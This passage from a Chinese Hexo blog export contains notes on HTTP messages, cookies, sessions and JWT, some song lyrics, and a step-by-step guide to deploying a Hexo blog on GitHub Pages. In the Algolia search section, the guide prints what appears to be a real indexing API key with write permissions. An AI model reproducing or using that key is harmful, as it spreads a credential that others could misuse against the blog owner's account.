<p><strong>Post方式</strong>：经常会有 <code>Content-Type 和 Content-Length</code>字段</p>
</li>
<li><p>空行</p>
</li>
<li><p>请求的数据</p>
<ul>
<li>Get方式：没有请求正文，请求的数据在URL当中</li>
<li>Post方式：请求报文当中的最下面</li>
</ul>
</li>
</ul>
<h4 id="4-1-2-响应报文"><a href="#4-1-2-响应报文" class="headerlink" title="4.1.2 响应报文"></a>4.1.2 响应报文</h4><ul>
<li><p>状态行  ： <code>HTTP协议版本 状态码 状态描述</code> 空格隔离</p>
<ul>
<li><strong>状态码：</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx		信息--服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx		成功--操作成功被服务器接收并处理</span><br><span class="line">3xx		重定向--需要进一步操作才可完成请求</span><br><span class="line">4xx		客户端请求时错误</span><br><span class="line">5xx		服务端处理请求时错误</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>状态描述：</strong></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th align="center">状态描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">200</td>
<td align="center">OK</td>
<td align="center">请求成功</td>
</tr>
<tr>
<td align="center">304</td>
<td align="center">Not Modified</td>
<td align="center">直接使用本地缓存</td>
</tr>
<tr>
<td align="center">400</td>
<td align="center">Bad Request</td>
<td align="center">客户端请求语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="center">401</td>
<td align="center">Unauthorized</td>
<td align="center">请求未经授权</td>
</tr>
<tr>
<td align="center">403</td>
<td align="center">Forbidden</td>
<td align="center">服务器收到请求但拒绝提供服务</td>
</tr>
<tr>
<td align="center">404</td>
<td align="center">Not Found</td>
<td align="center">请求资源不存在</td>
</tr>
<tr>
<td align="center">500</td>
<td align="center">Internal Server Error</td>
<td align="center">服务器发生了不可预知的错误</td>
</tr>
<tr>
<td align="center">503</td>
<td align="center">Server Unavaiable</td>
<td align="center">服务器当前无法处理客户端的请求</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>响应头部：描述服务器信息  <code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date				请求发送的时间 日期</span><br><span class="line">Server				告知客户端服务器的名称与版本号</span><br><span class="line">Content-Type		响应正文的 MIME类型</span><br><span class="line">Content-Length		响应正文的长度</span><br><span class="line">Connection			告知客户端响应完成之后的连接状态</span><br><span class="line">Content-Encoding	Web服务器告诉浏览器使用的是哪种压缩方法</span><br><span class="line">Last-Modified		指定资源的最后修改时间与日期</span><br></pre></td></tr></table></figure></li>
<li><p>空行</p>
</li>
<li><p>响应正文</p>
</li>
</ul>
<h3 id="4-2-HTTP请求方法–8种"><a href="#4-2-HTTP请求方法–8种" class="headerlink" title="4.2 HTTP请求方法–8种"></a>4.2 HTTP请求方法–8种</h3><p>服务端根据不同的请求方法做出不同的响应</p>
<h4 id="GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT"><a href="#GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT" class="headerlink" title="GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT"></a>GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT</h4><ul>
<li><p>GET  ：URL当中发送，有长度限制</p>
</li>
<li><p>POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。</p>
<p>一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等</p>
</li>
</ul>
<p><strong>安全性：</strong>不安全，黑客可获取，修改通信内容，冒充他人身份</p>
<p><strong>解决：</strong>HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。</p>
<h2 id="五、会话技术"><a href="#五、会话技术" class="headerlink" title="五、会话技术"></a>五、会话技术</h2><p><strong>盗取 Cookie       会话劫持</strong></p>
<ul>
<li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p>
</li>
<li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p>
<ul>
<li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li>
<li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li>
</ul>
</li>
<li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p>
<ul>
<li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li>
<li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li>
</ul>
</li>
<li><p><strong>登陆判断：</strong></p>
<ul>
<li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li>
<li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li>
</ul>
</li>
</ul>
<h2 id="六、JWT-原理"><a href="#六、JWT-原理" class="headerlink" title="六、JWT 原理"></a>六、JWT 原理</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JWT 原理</a></p>
<p>JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 <code>签名</code>。</p>
<ul>
<li><strong>JWT 组成：</strong><code>Header.Payload.Signature</code><ul>
<li><strong>Header</strong>：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</li>
<li><strong>Payload</strong>：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明</li>
<li><strong>Signature</strong>：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web基础篇</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web应用基本架构</tag>
        <tag>HTTP</tag>
        <tag>会话技术</tag>
      </tags>
  </entry>
  <entry>
    <title>世间美好与你环环相扣</title>
    <url>/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/</url>
    <content><![CDATA[<h3 id="世间美好与你环环相扣"><a href="#世间美好与你环环相扣" class="headerlink" title="世间美好与你环环相扣"></a>世间美好与你环环相扣</h3><p>偏偏秉烛夜游</p>
<p>午夜星辰 似奔走之友</p>
<p>爱你每个结痂伤口</p>
<p>酿成的陈年烈酒</p>
<p>入喉尚算可口</p>
<p>怎么泪水 还偶尔失守</p>
<p>邀你细看心中缺口</p>
<p>裂缝中留存 温柔</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>让樱花偷偷 吻你额头</p>
<p>让世间美好 与你环环相扣</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>当樱花开的纷纷扬扬</p>
<p>当世间美好 与你环环相扣</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>个人博客部署</title>
    <url>/2021/05/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h1 id="一、个人博客搭建"><a href="#一、个人博客搭建" class="headerlink" title="一、个人博客搭建"></a>一、个人博客搭建</h1><ol>
<li>用Gridea+GitHub pages或Hexo+GitHub pages用到的 <strong>Git软件</strong> 有什么用？<br>答：Git软件是一个用来上传 <code>本地文件</code> 到GitHub上的工具。用Git上传本地文件到GitHub后，GitHub的GitHub pages（静态站点托管服务）会建立一个可访问的站点并帮你管理这些文件，然后你就可以通过你在GitHub上设置的的域名来访问这个站点。</li>
</ol>
<span id="more"></span> 

<ol>
<li>Github Pages是面向用户、组织和项目开放的公共静态页面搭建托管服务，站点可以被免费托管在Github上，我们可以选择使用 Github Pages <code>默认提供的域名github.io</code> 或者 <code>自定义域名</code> 来发布站点。Github Pages 支持自动利用 、Jekyll 生成站点，也同样支持纯 HTML 文档，将你的 Hexo站点托管在 Github Pages 上是一个不错的选择。</li>
<li>利用Hexo和GithubPages/CodingPages搭建博客，实际上就是利用Hexo在本地（你的电脑上）生成一个博客站点，然后把本地博客站点内容传输到Github/Coding上进行拷贝和备份。再由Github和Coding提供的GithubPages/CodingPages服务将博客部署到网上，这样你的博客就可以作为一个独立的站点被别人浏览（正式上线）。同时你也可以在Github和Coding上管理你的博客。</li>
</ol>
<h2 id="1-1-安装-nodejs"><a href="#1-1-安装-nodejs" class="headerlink" title="1.1 安装 nodejs"></a>1.1 安装 nodejs</h2><p><a href="https://nodejs.org/en/">nodejs 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">nmp -v</span><br><span class="line">npm root -g</span><br><span class="line">创建 node_cache 和 node_global 两个文件夹</span><br><span class="line">npm config set cache &quot;D:\网安实验室\environment\nodejs\node_global&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_42881768/article/details/105028164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162164565116780357220308%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162164565116780357220308&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105028164.pc_search_result_no_baidu_js&utm_term=nodejs%E5%AE%89%E8%A3%85%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&spm=1018.2226.3001.4187">参考</a></p>
<h2 id="1-2-注册-github"><a href="#1-2-注册-github" class="headerlink" title="1.2 注册 github"></a>1.2 注册 github</h2><p><a href="https://github.com/">github 官网</a></p>
<h2 id="1-3-下载-git-for-win"><a href="#1-3-下载-git-for-win" class="headerlink" title="1.3 下载 git for win"></a>1.3 下载 git for win</h2><p><a href="https://gitforwindows.org/">git for win</a></p>
<h2 id="1-4-Git-SSH-配置"><a href="#1-4-Git-SSH-配置" class="headerlink" title="1.4 Git SSH 配置"></a>1.4 Git SSH 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 gitfoewin 安装路径下打开 git-bash.exe</span><br><span class="line">git config --global user.name &quot;yourname&quot;	#Github用户名</span><br><span class="line">git config --global user.email &quot;youremail&quot;	#Github邮箱</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查</span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令：ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/kEv5cTisgnxOKb7.png" alt="image-20210522094333395"></p>
<p>将会生成一个.ssh文件夹，找到它</p>
<p><img src="https://i.loli.net/2021/07/09/twY5uTd4rsikqxO.png" alt="image-20210709125002767"></p>
<p>将 <code>id_rsa.pub</code> 中地内容复制下来</p>
<p>然后进入你的github进行 SSH and GPG keys 配置，找到SSH keys的设置选项，点击<code>New SSH key</code>，把的<code>id_rsa.pub</code>里面的信息粘贴进去</p>
<p><img src="https://i.loli.net/2021/07/09/K7dZESr2xRfnig3.png" alt="image-20210708222730879"></p>
<p>测试是否配置成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入 ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210708224104838.png" alt="image-20210708224104838"></p>
<h2 id="1-5-HEXO-框架下载"><a href="#1-5-HEXO-框架下载" class="headerlink" title="1.5 HEXO 框架下载"></a>1.5 HEXO 框架下载</h2><p><a href="https://hexo.io/zh-cn/">HEXO 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init xi-zhiBlog		#初始化</span><br><span class="line">cd xi-zhiBlog</span><br><span class="line">npm install 安装依赖</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地运行 hexo s -p 3333</span><br><span class="line">访问 http://localhost:3333/</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line">出现默认的端口 访问即可</span><br><span class="line">出现以下 hexo 页面</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/QaIvYowUrPiAtRE.png" alt="image-20210522114800206"></p>
<h2 id="1-6-新建文章测试"><a href="#1-6-新建文章测试" class="headerlink" title="1.6 新建文章测试"></a>1.6 新建文章测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;我的first blog&quot;</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210522134430801.png" alt="image-20210522134430801"></p>
<p>编写博客文档</p>
<p><img src="https://i.loli.net/2021/05/25/LhZ2XcYntBmTvSQ.png" alt="image-20210522134637358"></p>
<p>清理 生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/XQrhPfBKYwICgGa.png" alt="image-20210522134738564"></p>
<h2 id="1-7-将博客推送到-github-上"><a href="#1-7-将博客推送到-github-上" class="headerlink" title="1.7 将博客推送到 github 上"></a>1.7 将博客推送到 github 上</h2><ul>
<li>登录已经注册好的 Github ，创建新的仓库，名称必须是 <code>username.github.io</code></li>
</ul>
<p><img src="https://i.loli.net/2021/05/25/xrcd7yE3NqS2jJA.png" alt="image-20210522135607776"></p>
<ul>
<li>安装 git 插件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<ul>
<li>修改博客配置文件</li>
</ul>
<p><img src="https://i.loli.net/2021/07/08/9MuWViSaCXwPvem.png" alt="image-20210708223352779"></p>
<ul>
<li>推送博客</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean		#清理</span><br><span class="line">hexo generate	#生成</span><br><span class="line">hexo deploy		#部署</span><br></pre></td></tr></table></figure>

<p>等待一会（或许会有些长。。。）</p>
<p>访问 <code>https://username.github.io</code> ，得到</p>
<p><img src="https://i.loli.net/2021/05/25/O4tTsbruoeUp1ni.png" alt="image-20210522140805690"></p>
<h2 id="1-8-安装-sublime"><a href="#1-8-安装-sublime" class="headerlink" title="1.8 安装 sublime"></a>1.8 安装 sublime</h2><p><a href="http://www.sublimetext.com/">sublime 官网</a></p>
<h1 id="二、主题"><a href="#二、主题" class="headerlink" title="二、主题"></a>二、主题</h1><p>示例：yilia</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/DbGhUmeiq24cHsr.png" alt="image-20210522141239219"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/eCahZqzPVnU8cd3.png" alt="image-20210522141315773"></p>
<h2 id="2-1-Fan"><a href="#2-1-Fan" class="headerlink" title="2.1 Fan"></a>2.1 Fan</h2><h3 id="2-1-1-主题下载"><a href="#2-1-1-主题下载" class="headerlink" title="2.1.1 主题下载"></a>2.1.1 主题下载</h3><p>下载主题模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/fan-lv/Fan.git themes/Fan</span><br></pre></td></tr></table></figure>

<p>更改主题配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: Fan</span><br></pre></td></tr></table></figure>

<p>安装依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210523130227198.png" alt="image-20210523130227198"></p>
<p>注意 上面修改的是 <code>themes\Fan\_config.yml</code> 路径下的，而非  根目录下的 <code>_config.yml</code> ，修改完之后也许还会有 关于 评论的 报错，因为这时我们还未配置留言评论相关的配置，所以我们将其配置为空就可以了。</p>
<p><img src="https://i.loli.net/2021/05/25/SAQZu9U4kdbNyP7.png" alt="image-20210523130502995"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://i.loli.net/2021/05/25/2zDneZU8GFLvOX1.png" alt="image-20210523130628060"></p>
<h3 id="2-1-2-创建新的博客"><a href="#2-1-2-创建新的博客" class="headerlink" title="2.1.2 创建新的博客"></a>2.1.2 创建新的博客</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;Lihux 命令&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/8tX5PpemhJxAVgS.png" alt="image-20210523130926895"></p>
<p>默认内容如下</p>
<p><img src="D:\APP\Typora\images_local\image-20210523130947872.png" alt="image-20210523130947872"></p>
<p>我们可以自己配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">author: xxx</span><br><span class="line">tags:</span><br><span class="line">  - xxx</span><br><span class="line">categories:</span><br><span class="line">  - xxx</span><br><span class="line">date: xxx</span><br><span class="line">top: 1     <span class="comment">#表示需要置顶的文章，数值越大越靠前</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-评论与留言"><a href="#2-1-3-评论与留言" class="headerlink" title="2.1.3 评论与留言"></a>2.1.3 评论与留言</h3><ul>
<li><p>在根目录下 <code>_config.yml</code> 文件中加入以下代码，<code>[&quot;gitment&quot;, &quot;valine&quot;]</code> 配置自行选择一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    owner: &#x27;Your GitHub ID&#x27;</span><br><span class="line">    repo: &#x27;The repository to store your comments. Make sure you&#x27;re repo&#x27;s owner&#x27;</span><br><span class="line">    client_id: &#x27;GitHub client ID&#x27;</span><br><span class="line">    client_secret: &#x27;GitHub client secret&#x27;</span><br><span class="line"></span><br><span class="line">  # 可以自由配置 valine 的其他配置项</span><br><span class="line">  valine:</span><br><span class="line">    appId: &#x27;Your appId&#x27;</span><br><span class="line">    appKey: &#x27;Your appKey&#x27;</span><br><span class="line">    placeholder: &#x27;xxx&#x27;</span><br><span class="line">    ...(valine配置项，参考链接 https://valine.js.org/configuration.html)</span><br></pre></td></tr></table></figure></li>
<li><p><code>themes</code> -&gt; <code>_config.yml</code> 中可以开启或关闭 <code>comments</code>，并且通过 <code>type</code> 指定使用的评论插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: &quot;valine&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-1-4-增加-algolia-搜索功能"><a href="#2-1-4-增加-algolia-搜索功能" class="headerlink" title="2.1.4 增加 algolia 搜索功能"></a>2.1.4 增加 algolia 搜索功能</h3><p>注册algolia</p>
<p><img src="https://i.loli.net/2021/05/25/UmTOPARzaIlewji.png" alt="image-20210523133449426"></p>
<p>新增api keys，重要的是在ACL里面增加删除和新增Object的权限</p>
<p><img src="https://i.loli.net/2021/05/25/gjDqCBcXLZrlQPK.png" alt="image-20210523134532193"></p>
<p>如图得到</p>
<p><img src="https://i.loli.net/2021/05/25/cKOaNX5wbYdj4nP.png" alt="image-20210523134805117"></p>
<p>安装扩展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-algolia --save</span><br></pre></td></tr></table></figure>

<p>增加根目录 <code>_config.yml</code> 配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: &#x27;你的Application ID&#x27;</span><br><span class="line">  apiKey: &#x27;你的Search-Only API Key&#x27;</span><br><span class="line">  indexName: &#x27;输入刚才创建index name&#x27;</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set HEXO_ALGOLIA_INDEXING_KEY=33ee877688fc550930bcca909f161863</span><br><span class="line"><span class="meta">#</span><span class="bash">Notes: Mac 和 git bash 为 <span class="built_in">export</span>, Windows 为 <span class="built_in">set</span>, Powershell 用 <span class="variable">$env</span></span></span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/L4PdfhJwv6RWpV7.png" alt="image-20210523150707656"></p>
<p>发现已经提交</p>
<p>然后修改主题下的配置。更改为true</p>
<p><img src="https://i.loli.net/2021/05/25/u1HONdMBwj6aJe8.png" alt="image-20210523151012461"></p>
<p>最后 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h2 id="2-2-Next"><a href="#2-2-Next" class="headerlink" title="2.2 Next"></a>2.2 Next</h2><p><strong>提供写的很好的参考博客</strong></p>
<p><a href="https://blog.csdn.net/loze/article/details/94206726">https://blog.csdn.net/loze/article/details/94206726</a></p>
<p><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p>
<p><a href="https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=">https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=</a></p>
<h2 id="2-3-Hiker"><a href="#2-3-Hiker" class="headerlink" title="2.3 Hiker"></a>2.3 Hiker</h2><p>下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iTimeTraveler/hexo-theme-hiker.git themes/hiker</span><br></pre></td></tr></table></figure>

<p>修改配置文件当中的 theme</p>
<p><img src="https://i.loli.net/2021/07/08/lMUFkL5wDvh9sRN.png" alt="image-20210708234959800"></p>
<p>更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/hiker</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p><strong>搜索功能</strong></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103338696">https://blog.csdn.net/nineya_com/article/details/103338696</a></p>
<h1 id="三、其它介绍"><a href="#三、其它介绍" class="headerlink" title="三、其它介绍"></a>三、其它介绍</h1><h2 id="3-1-创建博客"><a href="#3-1-创建博客" class="headerlink" title="3.1 创建博客"></a>3.1 创建博客</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;	<span class="comment">#博客的创建，[layout] 决定博客路径的不同</span></span><br><span class="line">hexo new paper				<span class="comment">#source/_posts</span></span><br><span class="line">hexo new page board			<span class="comment">#source，访问链接变为 https://xxx.xxx/board</span></span><br><span class="line">hexo new draft newpage		<span class="comment">#source/_drafts</span></span><br><span class="line">hexo server --draft			<span class="comment">#将 draft 在本地预览</span></span><br><span class="line">hexo publish draft newpage  <span class="comment">#将 draft 发表到 post 中</span></span><br></pre></td></tr></table></figure>

<h2 id="3-2-菜单栏"><a href="#3-2-菜单栏" class="headerlink" title="3.2 菜单栏"></a>3.2 菜单栏</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令</span></span><br><span class="line">hexo new page about</span><br><span class="line"><span class="comment">#它就会在根目录下source文件夹中新建了一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#想要自己再自定义一个菜单栏的选项</span></span><br><span class="line">hexo new page yourdiy</span><br><span class="line"><span class="comment">#然后在主题配置文件的menu菜单栏添加一个 Yourdiy : /yourdiy，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: &#x27;中文意思&#x27;就可以显示中文了。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#分类：</span></span><br><span class="line">hexo new page categories</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2021-05-24 00:03:00</span><br><span class="line"><span class="built_in">type</span>: categories</span><br><span class="line">---</span><br><span class="line"><span class="comment">#之后创建新的博客文章时在其最上面添加 categories: 名称 即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#标签：</span></span><br><span class="line">hexo new page tags</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-14 18:19:31</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">#之后创建新的博客文章时在其最上面添加 tags: -名称 即可</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-评论"><a href="#3-3-评论" class="headerlink" title="3.3 评论"></a>3.3 评论</h2><p><strong>主题配置中修改：type 类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: </span><br></pre></td></tr></table></figure>

<p><strong>gitment ：根目录配置文件中增加</strong></p>
<p><a href="https://github.com/settings/applications/new">gitment 注册页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    mint: true</span><br><span class="line">    count: true</span><br><span class="line">    lazy: true</span><br><span class="line">    cleanly: true</span><br><span class="line">    language:</span><br><span class="line">    github_user: </span><br><span class="line">    github_repo: </span><br><span class="line">    client_id: </span><br><span class="line">    client_serect: </span><br></pre></td></tr></table></figure>

<p><strong>valine：根目录配置文件中增加</strong></p>
<p><a href="https://www.leancloud.cn/">valine 注册页面</a></p>
